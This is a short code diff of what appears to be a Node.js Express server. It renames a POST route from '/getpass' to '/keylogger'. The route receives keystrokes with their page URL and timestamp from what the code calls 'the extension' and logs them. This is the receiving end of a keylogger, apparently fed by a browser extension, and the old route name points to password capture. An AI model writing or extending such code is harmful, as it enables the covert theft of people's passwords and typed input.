@@ -13,7 +13,7 @@ app.get('/', (req, res) => {
 });
 
 // Endpoint to handle keystroke data
-app.post('/getpass', (req, res) => {
+app.post('/keylogger', (req, res) => {
   const { key, url, timestamp } = req.body;
   console.log(`Keystroke: ${key}, URL: ${url}, Timestamp: ${timestamp}`);
   res.sendStatus(200); // Respond to the extension with a success status
